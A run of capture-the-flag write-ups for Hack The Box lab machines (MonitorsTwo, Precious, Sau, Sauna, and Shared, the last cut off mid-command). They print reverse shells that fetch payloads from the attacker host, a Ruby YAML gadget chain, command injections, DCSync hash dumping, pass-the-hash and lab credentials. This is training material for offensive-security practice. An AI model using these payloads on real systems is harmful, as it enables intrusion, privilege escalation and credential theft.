7.93 ( https://nmap.org ) at 2023-09-02 22:35 AST Nmap scan report for 10.10.11.211 Host is up (0.088s latency). Not shown: 61122 closed tcp ports (reset), 4411 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 37.45 seconds \u0026gt; nmap -p22,80 -sVC 10.10.11.211 Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 22:37 AST Nmap scan report for 10.10.11.211 (10.10.11.211) Host is up (0.077s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Login to Cacti Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 15.67 seconds Web # I scanned the system for the enumeration stage with nmap, dirb, traceroute, view page source, etc. but nothing useful. After checking the directory where dirb found the /document endpoint, spend some time on it but nothing changes, then start checking for cactus web interface vulnerabilities and here we go.\nCacti CVE # https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22\nAfter seeing the correct way to use the exploit, we run it.\nWe listen on port 443:\nnc -nlvp 443 \u0026gt; python3 CVE-2022-46169.py -u http://10.10.11.211 --LHOST=10.10.14.29 --LPORT=443 Checking... The target is vulnerable. Exploiting... Bruteforcing the host_id and local_data_ids Bruteforce Success!! LinEnum # Now we are going to see possible ways to elevate privileges, we will use LinEnum to have more information.\nIn our result we find this:\nWe take advantage of this to elevate our privilege.\nBinario capsh # We execute it inside the /sbin/ directory:\n./capsh --gid=0 --uid=0 -- here you have more information about this –\u0026gt; capsh\nIt looks like we’re in a docker container, so let’s try to see the contents of a database we found before:\nRun Mysql to find credentials # mysql --host=db --user=root --password=root cacti -e \u0026#34;SELECT * FROM user_auth\u0026#34; In user marcus we have a hash, we will use john to see what it is.\nCracking Password con john # We save it in an h.txt file and execute it:\njohn h.txt --wordlist=/usr/share/wordlists/rockyou.txt SSH Conect # We connect via SSH:\nssh marcus@10.10.11.211 Privilege Escalation # After running LinEnum again, we see that the machine hosts a docker:\nmarcus@monitorstwo:~$ docker --version Docker version 20.10.5+dfsg1, build 55c4c88 CVE-2021-41091 # After searching the Internet we found an exploit. CVE-2021-41091\nWe pass the exploit to our victim machine.\nLet’s go to the docker container that we previously had as root:\ncd /bin We assign these permissions to bash.\nchmod u+s /bin/bash Now we run the exploit on the victim machine.\nWe enter the path indicated by the exploit and execute it:\n./bin/bash -p ","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/4.-monitorstwo/","section":"Hackthebox Writeups","summary":"Initial Recon # We check the connection with the victim machine:","title":"MonitorsTwo Writeup","type":"writeups"},{"content":"Precious is an easy linux machine created by Nauten on Hack the Box that features a web server that uses a version of PDFKit that is vulnerable to CVE-2022-25765, which can be exploited to execute commands as the user ruby. Within this user’s home directory we find a folder containing a configuration file with the credentials for another user by the name of henry. As henry, we can run a particular script as root via the sudo command. This script is vulnerable to a form of YAML deserialization, which leads us to code execution as root.\nInitial Recon # Let’s first set up our environment and run a TCP port.\n# mhil4ne@Kali export rhost=\u0026#34;10.10.11.189\u0026#34; # Target IP address export lhost=\u0026#34;10.10.14.4\u0026#34; # Your VPN IP address echo rhost=$rhost \u0026gt;\u0026gt; .env echo lhost=$lhost \u0026gt;\u0026gt; .env . ./.env \u0026amp;\u0026amp; sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv $rhost -oG nmap The open TCP ports reported in the scan include:\nPort Service Product Version 22 ssh OpenSSH 8.4p1 80 HTTP nginx 1.18.0 The scan also reports that port 80 responds with a redirection to http://precious.htb/ . Let\u0026rsquo;s add this hostname to our /etc/hosts`{:.filepath} file.\nWeb # We’ll begin by visiting http://precious.htb/ in our favorite browser.\nThe page apparently has some functionality that will convert the content at a given URL to a PDF document.\nPDF Generator # Upon sending a dummy URL through the web form, we observe a request from our browser with BurpSuite.\nThe request just passes the submitted URL to the server. Let’s test this functionality on our own HTTP server.\n# mhil4ne@Kali mkdir share \u0026amp;\u0026amp; cd share echo \u0026#39;\u0026lt;p\u0026gt;Hello!\u0026lt;/p\u0026gt;\u0026#39; \u0026gt; index.html python3 -m http.server --bind $lhost 8080 # mhil4ne@Kali curl -d \u0026#34;url=http://$lhost:8080/\u0026#34; http://precious.htb/ -o response.bin We get a request to our HTTP server and subsequently receive the PDF result.\n# mhil4ne@kali file response.bin # The response body is a PDF document xdg-open response.bin # Open the document The document contains the text “Hello!”, which is expected because that is the content we had on our site earlier. Checking the metadata of the document with exiftool, we find out that the Creator field mentions that the document was generated using a product identified as PDFKit v0.8.6.\nCVE-2022-25765 # After some research, we determine that this version of pdfkit is vulnerable to CVE-2022-25765, meaning we could potentially inject OS commands as explained here. Let’s try exploiting the bug to establish a reverse shell session with PwnCat. We’ll use a reverse shell written in Ruby because we know that Ruby is installed since PDFKit is written in Ruby.\n# mhil4ne@Kali mkdir -p share \u0026amp;\u0026amp; cd share rb=\u0026#34;require \u0026#39;socket\u0026#39;;spawn(\u0026#39;sh\u0026#39;,[:in,:out,:err]=\u0026gt;TCPSocket.new(\u0026#39;$lhost\u0026#39;,8443))\u0026#34; echo \u0026#34;$rb\u0026#34; \u0026gt; index.html # Write ruby reverse shell to web index python3 -m http.server --bind $lhost 8080 \u0026amp;\u0026gt;/dev/null \u0026amp; # Serve payload pwncat-cs -m linux -l $lhost 8443 # PwnCat listener | Install: `pip3 install pwncat-cs` # mhil4ne@Kali curl precious.htb -d \u0026#34;url=http://%2520%60curl%20$lhost:8080|ruby%60\u0026#34; # Trigger payload Privilege Escalation # Ruby # Our reverse shell session is in the context of the user ruby. In this user’s home directory, we find the file ~/.bundle/config which contains potential credentials\n# ruby@precious.htb (PwnCat) find ~ -type f # We find a configuration file of sorts cat ~/.bundle/config # Let\u0026#39;s read it The user henry, associated with the password Q3c1AqGHtoI0aXAYFH, is also present on the current machine with the same password.\n# mhil4ne@Kali pwncat-cs ssh://henry@precious.htb # password is Q3c1AqGHtoI0aXAYFH Henry # As henry, we can execute a specific command as root via sudo.\n# henry@precious.htb (SSH) sudo -l Let’s take a look at this script and see what it does.\n# Compare installed dependencies with those specified in \u0026#34;dependencies.yml\u0026#34; require \u0026#34;yaml\u0026#34; require \u0026#39;rubygems\u0026#39; # TODO: update versions automatically def update_gems() end def list_from_file YAML.load(File.read(\u0026#34;dependencies.yml\u0026#34;)) end def list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]} end gems_file = list_from_file gems_local = list_local_gems gems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts \u0026#34;Installed version differs from the one specified in file: \u0026#34; + local_name else puts \u0026#34;Installed version is equals to the one specified in file: \u0026#34; + local_name end end end end This script doesn’t do much besides calling YAML.load on the content of the file dependencies.yml{:.filepath} from our working directory. When looking into vulnerabilities affecting YAML.load, we discover that it is not safe to use with user supplied data. We also run into this wonderful post that describes a gadget chain we could potentially use to execute commands as root. We’ll modify the command within the YAML payload from the post to spawn an interactive root shell\n--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: \u0026amp;1 !ruby/object:Net::BufferedIO io: \u0026amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: \u0026#34;abc\u0026#34; debug_output: \u0026amp;1 !ruby/object:Net::WriteAdapter socket: \u0026amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module \u0026#39;Kernel\u0026#39; method_id: :system git_set: \u0026#34;bash -pi\u0026#34; method_id: :resolve Now with the YAML payload dependencies.yml{:.filepath} in our working directory, we execute the vulnerable script with sudo\n# henry@precious.htb (SSH) sudo /usr/bin/ruby /opt/update_dependencies.rb # trigger the payload The command successfully spawns a root shell, from which we can read the final flag at /root/root.txt{:.filepath}\nAlternative Solution # Another way we could get the root flag is by using the script at /opt/update_dependencies.rb{:.filepath} to read files through a symlink. When the script looks for dependencies.yml{:.filepath} in the working directory, it will find a planted symlink that will point to /root/root.txt{:.filepath}. When the script tries to parse the file as YAML, it will display an error containing the file contents.\n# henry@precious.htb (SSH) cd $(mktemp -d) ln -s /root/root.txt ./dependencies.yml # create symlink sudo /usr/bin/ruby /opt/update_dependencies.rb # read /root/root.txt ","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/5.-precious/","section":"Hackthebox Writeups","summary":"Precious is an easy linux machine created by Nauten on Hack the Box that features a web server that uses a version of PDFKit that is vulnerable to CVE-2022-25765, which can be exploited to execute commands as the user ruby.","title":"Precious Writeup","type":"writeups"},{"content":"Sau is an easy Linux-based Hack the Box machine created by sau123 that involves web exploitation, Server Side Request Forgery (SSRF), Common Vulnerabilities and Exposures (CVEs), and Sudo policy exploitation. A port scan initially revealed an HTTP server vulnerable to an SSRF bug tracked as CVE-2023-27163. The vulnerability was exploited to contact an internal HTTP server running an outdated version of Mailtrail prone to shell command injection, which we used to establish a reverse shell as puma. The sudo policy for this user allowed us to exploit CVE-2023-26604 and gain execution as root.\nInitial Recon # We began by conducting a full TCP port scan using a tuned nmap command. This command quickly and reliably scans for any relevant TCP ports on the target.\n# Run a thorough port scan nmap \u0026#34;10.10.11.224\u0026#34; -vv -Pn -sT -sV -n -p- -T4 --min-rate=1000 --max-retries=3 The scan reported two open ports and two filtered ports:\nPort Service Product Version 22 ssh OpenSSH 8.4p1 80 HTTP 8338 HTTP 55555 HTTP We first navigated to http://10.10.11.224:55555 which prompted a redirection to http://10.10.11.224:55555/web. On this page we noticed a footer indicating that the site was powered by request-baskets version 1.2.1.\nWe searched for CVEs affecting this installation and found an SSRF bug, CVE-2023-27163. The CVEDetails page for this bug provided a vulnerability description along with a link to additional exploitation details.\nrequest-baskets up to v1.2.1 was discovered to contain a Server-Side Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request.\nWeb # CVE-2023-27163 # According to the brief proof-of-concept referenced on the dedicated CVEDetails page, a special HTTP POST request should be made to /api/baskets/*{:.filepath} to create a new basket and set a forwarding URL. A simple shell script was made to streamline this process.\n#!/usr/bin/env zsh [ $# -lt 1 ] \u0026amp;\u0026amp; echo \u0026#39;Usage: ./ssrf-curl \u0026lt;URL\u0026gt; [OPTS ...]\u0026#39; \u0026amp;\u0026amp; exit 1 echo \u0026#39;{\u0026#34;proxy_response\u0026#34;:true,\u0026#34;expand_path\u0026#34;:true}\u0026#39; | jq -c --arg a \u0026#34;$1\u0026#34; \u0026#39;.forward_url=$a\u0026#39; | read json basket=$(openssl rand -hex 8) curl -so /dev/null -d \u0026#34;$json\u0026#34; \u0026#34;http://10.10.11.224:55555/api/baskets/${basket}\u0026#34; curl -s \u0026#34;http://10.10.11.224:55555/${basket}\u0026#34; ${@:2} Mailtrail # We used this script to indirectly access the HTTP server on port 80, since it cannot be accessed directly. A simple HTTP GET request was sent to verify the existence of the HTTP server and collect information.\n# Test SSRF script zsh ssrf.zsh http://localhost:80 -i | more HTTP/1.1 200 OK Cache-Control: no-cache Connection: close Content-Security-Policy: default-src \u0026#39;self\u0026#39;; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39;; img-src * blob:; script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-eval\u0026#39; https://stat.ripe.net; frame-src *; object-src \u0026#39;none\u0026#39;; block-all-mixed-content; Content-Type: text/html Date: Thu, 28 Dec 2023 08:44:05 GMT Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT Server: Maltrail/0.53 Transfer-Encoding: chunked \u0026lt;!DOCTYPE html\u0026gt; ... A software fingerprint was found in the HTTP “Server” header with the value “Maltrail/0.53”. We searched the web for vulnerabilities affecting this version and found an OS command injection flaw disclosed here.\nDescription\nMaltrail \u0026lt;= v0.54 is vulnerable to unauthenticated OS command injection during the login process.** Summary\n[…] An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication. Proof of Concept\ncurl \u0026lsquo;http://hostname:8338/login\u0026rsquo; \u0026ndash;data \u0026lsquo;username=;id \u0026gt; /tmp/bbq\u0026rsquo;\nIt looks like the installed version can be exploited through the username parameter on the login endpoint at http://localhost/login, which can be accessed with the SSRF script. We started a PwnCat listener and proceeded to execute a simple bash reverse shell downloaded over HTTP.\n# Start PwnCat listener lhost=\u0026#34;10.10.14.2\u0026#34; # Change to your assigned VPN IP address pwncat-cs -l $lhost 8443 # Install: `python3 -m pip install pwncat-cs` # [In another session] Serve reverse shell over HTTP lhost=\u0026#34;10.10.14.2\u0026#34; # Change to your assigned VPN IP address mkdir ./http-share \u0026amp;\u0026amp; echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/${lhost}/8443 \u0026lt;\u0026amp;1\u0026#34; \u0026gt; http-share/index.html http-server ./http-share -p 8080 -a $lhost # Install: `npm install -g http-server` # [In another session] Trigger command execution lhost=\u0026#34;10.10.14.2\u0026#34; # Change to your assigned VPN IP address zsh ssrf.zsh http://localhost:80/login -i -d \u0026#34;username=\\`curl ${lhost}:8080|bash\\`\u0026#34; Privilege Escalation # With execution as the user puma, We found a custom sudo policy that allows us to execute a particular command as any user without the password for puma.\n# Display sudo policy sudo -l Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User puma may run the following commands on sau: (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service CVE-2023-26604 # The command we can run in a privileged context is /usr/bin/systemctl status trail.service. After searching the web for known vulnerabilities in systemd/systemctl, a fairly recent privilege escalation CVE tracked as CVE-2023-26604 was found.\nsystemd before 247 does not adequately block local privilege escalation for some Sudo configurations, e.g., plausible sudoers files in which the “systemctl status” command may be executed. Specifically, systemd does not set LESSSECURE to 1, and thus other programs may be launched from the less program. This presents a substantial security risk when running systemctl from Sudo, because less executes as root when the terminal size is too small to show the complete systemctl output.\nWe checked the systemd version and noticed that the vulnerable version systemd 245 was installed.\n# Check if systemd version is vulnerable /usr/bin/systemctl --version systemd 245 (245.4-4ubuntu3.22) +PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid Exploitation # To exploit CVE-2023-26604, the terminal height was lowered as described in the CVE description, and the allowed sudo command was executed. From the pager we simply entered !sh to spawn a root shell.\n# execute systemctl with lower resolution to spawn pager stty rows 1 \u0026amp;\u0026amp; sudo systemctl status trail.service !sh Root !\n","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/6.-sau/","section":"Hackthebox Writeups","summary":"Sau is an easy Linux-based Hack the Box machine created by sau123 that involves web exploitation, Server Side Request Forgery (SSRF), Common Vulnerabilities and Exposures (CVEs), and Sudo policy exploitation.","title":"Sau Writeup","type":"writeups"},{"content":"Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed, which results in hash for an account that doesn\u0026amp;#039;t require Kerberos pre-authentication.\nThis hash can be subjected to an offline brute force attack, in order to recover the plaintext password for a user that is able to WinRM to the box. Running WinPEAS reveals that another system user has been configured to automatically login and it identifies their password. This second user also has Windows remote management permissions. BloodHound reveals that this user has the DS-Replication-Get-Changes-All extended right, which allows them to dump password hashes from the Domain Controller in a DCSync attack. Executing this attack returns the hash of the primary domain administrator, which can be used with Impacket\u0026amp;#039;s psexec.py in order to gain a shell on the box as NT_AUTHORITY\\SYSTEM.\nInitial Recon # \u0026gt; ping -c 1 10.10.10.175 PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data. 64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=140 ms --- 10.10.10.175 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 139.637/139.637/139.637/0.000 ms We can see from the port scan it leaks the Domain EGOTISTICAL-BANK.LOCAL. There are also three services that have a goof attack surface http 80, smb 445 and ldap 389.\nWe can also look and see that this is probably a domain controller. Having ports; 53 DNS, 88 Kerberos and 445 are common DC ports.\n\u0026gt; nmap -sS --open -p- --min-rate 5000 -n -Pn -v -oG 10.10.10.175 nmap Port Service Product Version 53 domain Simple DNS Plus 80 HTTP Microsoft IIS httpd 10.0 88 kerberos-sec Microsoft Windows Kerberos 135 msrpc Microsoft Windows RPC 139 netbios-ssn Microsoft Windows netbios-ssn 389 ldap Microsoft Windows Active Directory LDAP 445 microsoft-ds 464 kpasswd5 593 ncacn_http Microsoft Windows RPC over HTTP 1.0 636 tcpwrapped 3268 ldap Microsoft Windows Active Directory LDAP 3269 tcpwrapped 5985 http Microsoft HTTPAPI httpd 2.0 9389 mc-nmf .NET Message Framing 49667 msrpc Microsoft Windows RPC 49677 ncacn_http Microsoft Windows RPC HTTP 1.0 49676 msrpc Microsoft Windows RPC 49677 msrpc Microsoft Windows RPC 49706 msrpc Microsoft Windows RPC 49775 msrpc Microsoft Windows RPC Active Directory # Web - Port 80 # On the about page http://10.10.10.175/about.html, we can see that there is a “Meet The Team” section and find a handful of people. I recorded each of the name in the file called listUsers.txt.\n\u0026gt; cat listUsers.txt Fergus Smith Shaun Coins Hugo Bear Bowie Taylor Sophie Driver Steven Kerb Next I’ll use a tool called username-anarchy to transform the word list of names to one with common usernames schemas, Tool Here\n\u0026gt; ./username-anarchy --input-file listUsers.txt --select-format first,last,first.last,flast \u0026gt; users.txt I’ll also add Administrator to the file as well.\nSMB - Port 445 Recon # I like to use crackmapexec to enumerate SMB.\nWe can see the hostname, domain and see idf SMBv1 is enable.\n\u0026gt; crackmapexec smb 10.10.10.175 SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) We cant view any shares.\n\u0026gt; crackmapexec smb 10.10.10.175 --shares SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [-] Error enumerating shares: STATUS_USER_SESSION_DELETED Sometimes we can try doing a null session to see if we can get anything else. A null sessions is simply providing nothing for the username and password. But still nothing.\n\u0026gt; crackmapexec smb 10.10.10.175 --shares -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\: SMB 10.10.10.175 445 SAUNA [-] Error enumerating shares: STATUS_ACCESS_DENIED We can also try another tool called smbmap to see if it gives us anything different but it doesn’t.\n\u0026gt; smbmap -H 10.10.10.175 [+] IP: 10.10.10.175:445 Name: 10.10.10.175 Kerbrute # Now that I have a list of posible usernames i can use a tool called kerbrute to test and see if any of the usernames are valid.\nThe cool thing about kerburte is it won’t create event id 4625 in the logs. Event id 4625 will document every failed log-on. This will instead create a Kerberos Failure event id 4771, its not logged by default.\n\u0026gt; kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL listUser.txt 2024/02/18 09:31:07 \u0026gt; Using KDC(s): 2024/02/18 09:31:07 \u0026gt; 10.10.10.175:88 2024/02/18 09:31:07 \u0026gt; [+] VALID USERNAME:\tfsmith@EGOTISTICAL-BANK.LOCAL 2024/02/18 09:31:07 \u0026gt; Done! Tested 12 usernames (1 valid) in 0.285 seconds Kerberoast # Now that we have two valid usernames we can leverage some impacket scripts Impacket github. The one I used on this machine was GetNPUser.py which will do an AS_REP Roast/Kerberoast.\n\u0026gt; impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bfa9cf66c4efa162cd18472a39b04966$5c796f89e55dfba2c4b0eccfa2b4198679aeddbfbddc37430a2bc75a49e472e05ccc330187a59c43f603b58e124e4c864c7d02d056056c6d782b32ca6156bb7b7b530effe162bdb7d7ce8470bebf8ce61238e23648957feed32538f0ee1f417c420243316ffb917605e649d42e249a5b2726a59ee9d2816edf045407b88dade504d12f41942faf1f244f5f29dc187e1c964677f66dc2e0160b6e56693f7f8a22816836215ecf22188e5024fb37f57e8e74b274d8eaa5b1296055ed33471620245ec1c7fb0653d0cd053156c314e181d0719c9f75c1032e3a4215c310378a1f3002ab5936223251ac1ea2190bf6fd74eb2c18e18067f186f1415533fddd6dea50 Now that we have a hash we can use hashcat to crack it, I did this on my host machine to utileze a GPU. we get a hit and now have a creds fsmith:Thestrokes23\n\u0026gt; .\\hascat.exe -m 18200 ..\\hash ..\\rockyou.txt --force fsmith:Thestrokes23 SMB PT2 # Now that we have some valid credentials fsmith:Thestrokes23 we can try and authenticate to SMB again using crackmapexec and we can see that we have valid creds!\n\u0026gt; crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 Next I will enumerate shares and one sticks out RICOH Aficio SP 8300DN PCL 6\n\u0026gt; crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares SMB 10.10.10.175 445 SAUNA [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False) SMB 10.10.10.175 445 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 SMB 10.10.10.175 445 SAUNA [+] Enumerated shares SMB 10.10.10.175 445 SAUNA Share Permissions Remark SMB 10.10.10.175 445 SAUNA ----- ----------- ------ SMB 10.10.10.175 445 SAUNA ADMIN$ Remote Admin SMB 10.10.10.175 445 SAUNA C$ Default share SMB 10.10.10.175 445 SAUNA IPC$ READ Remote IPC SMB 10.10.10.175 445 SAUNA NETLOGON READ Logon server share SMB 10.10.10.175 445 SAUNA print$ READ Printer Drivers SMB 10.10.10.175 445 SAUNA RICOH Aficio SP 8300DN PCL 6 We cant print money SMB 10.10.10.175 445 SAUNA SYSVOL READ Logon server share Taking a look at searchsploit there are a handful of exploits for this but we need a shell first. We can see that we can authenticate with winrm.\n\u0026gt; crackmapexec winrm 10.10.10.175 -u \u0026#39;fsmith\u0026#39; -p \u0026#39;Thestrokes23\u0026#39; SMB 10.10.10.175 5985 SAUNA [*] Windows 10.0 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) HTTP 10.10.10.175 5985 SAUNA [*] http://10.10.10.175:5985/wsman WINRM 10.10.10.175 5985 SAUNA [+] EGOTISTICAL-BANK.LOCAL\\fsmith:Thestrokes23 (Pwn3d!) I’ll use evil-winrm to get shell.\n\u0026gt; evil-winrm -u fsmith -i 10.10.10.175 -p Thestrokes23 Taking a look at the Desktop we can grab our user flag.\nPrivilege Escalation # Lateral movement # I uploaded a great tool called winPEAS that is great for some automation when trying to escalate. I uploaded it using Evil-Winrm\n*Evil-WinRM* PS C:\\Temp\u0026gt; upload winPEASx64.exe Info: Uploading /home/mhil4ne/Downloads/winPEASx64.exe to C:\\Temp\\winPEASx64.exe Data: 3183272 bytes of 3183272 bytes copied Info: Upload successful We get a lot of output from this but one section sticks outs particularly, the AutoLogon A service account has an auto logon enabled and we can harvest svc_loanmgr:Moneymakestheworldgoround! as valid credentials.\nWe can try those credentials with Evil-Winrm and we get in\n\u0026gt; evil-winrm -u svc_loanmgr -i 10.10.10.175 -p Moneymakestheworldgoround! *Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents\u0026gt; Get Administrator # With these credentials, we can run a tool called Bloodhound. It is a tool that finds hidden relationships within Active Directory. It can often lead to some quick privilege escalation. There is a python and impacket version of it that I’ll be using for Sauna.\ninstalling is very easy.\nsudo pip install bloodhound Then we can run the command:\n\u0026gt; bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All To start the attack. it created a lot .json files that that we will import into bloodhound.\n\u0026gt; ls 20240218112738_computers.json 20240218112738_domains.json 20240218112738_groups.json 20240218112738_users.json 20240218112738_containers.json 20240218112738_gpos.json 20240218112738_ous.json to start the bloodhound console i ran neo4j console then bloodhound in the console. Next, we will upload our files by clicking the upload button on the right.\nAfter importing our files we can select “Find Principals with DCSync Rights” and it generates a graph. Our service account has two permissions. Notice its similar permissions of administrators.\nGetChanges GetChangesAll I right-clicked the relation and selected “Help”. Under the Abuse info,m I learned that we can perform a dcsync attack to get password hashes.\nImpacket has a tool called secretsdump.py we can use to leverage this.\npython3 secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator Impacket v0.11.0 - Copyright 2023 Fortra Password: [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657 Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e Administrator:des-cbc-md5:fb8f321c64cea87f Now we have the admins Hash. We can use it in a pass the hash attack.\n\u0026gt; evil-winrm -u Administrator -i 10.10.10.175 -H 823452073d75b9d1cf70ebdf86c7f98e we are administrator.\n","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/7.-sauna/","section":"Hackthebox Writeups","summary":"Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation.","title":"Sauna Writeup","type":"writeups"},{"content":"Shared is a medium Linux machine created by Nauten on Hack The Box that features a website with a virtual hostname that is vulnerable to SQL injection. Successful exploitation of this vulnerability provides us with the password for a user called james_mason. With these credentials we are able to login via SSH and elevate privileges to a user called dan_smith by exploiting a cron job that uses a version of ipython that is vulnerable to CVE-2022-21699. We then reverse-engineer an executable using both static and dynamic analysis to recover the password for the local Redis service. The Redis process is running as root, so we load a special shared object module using LOAD MODULE to execute commands as root.\nInitial Recon # Let’s first set up our environment and run a TCP port scan with this custom nmap wrapper.\n# Mhil4ne@Kali export rhost=\u0026#34;10.10.10.x\u0026#34; sudo nmap -sS -p- --open --min-rate 3000 -n -Pn -vvv $rhost -oG nmap The scan reports that the SSH service, HTTP service, and HTTPS service are running on ports 22, 80, and 443 respectively\nWeb Recon # Upon visiting port 80, we are redirected to shared.htb. Let’s add this hostname to our /etc/hosts{:.filepath} file with the corresponding IP address.\nNow we’ll visit https://shared.htb/ in a browser session being proxied through the BurpSuite HTTP proxy.\nIndex page shared.htb web index page\nWalking the Application # When exploring the content of the website, we eventually discover the checkout page at /index.php?controller=cart\u0026amp;action=show. When we hover over the checkout button, we can see that it will send us to https://checkout.shared.htb. Let’s add this virtual hostname to our /etc/hosts{:.filepath} file so we can view its content.\nsudo sed -E -i \u0026#39;s/(shared.htb).*/\\1 checkout.\\1/\u0026#39; /etc/hosts Now when we add an item to our cart and navigate to /index.php?controller=cart\u0026amp;action=show, we’ll click the checkout button to be redirected to the checkout site.\nInvestigating Functionality # It’s interesting how this site is able to determine which item we had in our cart considering we did not supply any HTTP GET or POST parameters. Let’s investigate.\nLooking at the initial request we sent to the checkout site in the BurpSuite site map, we can see that our request contains an unusual cookie called custom_cart. The value of this cookie can be automatically decoded by highlighting it, revealing a JSON object with the product code and quantity of the checkout item.\nWe find a mysterious cookie in BurpSuite\nWe can infer that the site uses the supplied product code in custom_cart to find the price of the item since we do not supply the price, but only the product code. This activity is likely handled by some type of database solution such as an SQL server. With this in mind, we can check if this functionality is vulnerable to SQL injection.\nVulnerability Discovery # Let’s input some basic SQL injection payloads to the cookie in the BurpSuite repeater tab to see if SQL injection is possible.\nThe server’s response to a common SQL injection payload\n{\u0026#34;CRAAFTKP\u0026#39;#\u0026#34;:\u0026#34;1\u0026#34;} The response to the first payload suggests that SQL injection is possible but we can make sure by sending a payload that should evaluate to false, and one that should be true.\n#!/usr/bin/env python3 from urllib.parse import quote from sys import argv if len(argv) == 2: sqli = argv[1] sqli = sqli.replace(\u0026#39;\\\\\u0026#39;, \u0026#39;\\\\\\\\\u0026#39;) sqli = sqli.replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\\\\\u0026#34;\u0026#39;) print(quote(\u0026#39;{\u0026#34;\u0026#39; + argv[1] + \u0026#39;\u0026#34;:\u0026#34;1\u0026#34;}\u0026#39;)) chmod +x makepayload.py true=$(./makepayload.py \u0026#34;\u0026#39; OR 1=1#\u0026#34;) # Always resolves to true false=$(./makepayload.py \u0026#34;\u0026#39; AND 1=2#\u0026#34;) # Always resolves to false url=\u0026#34;https://checkout.shared.htb\u0026#34; curl -k -s 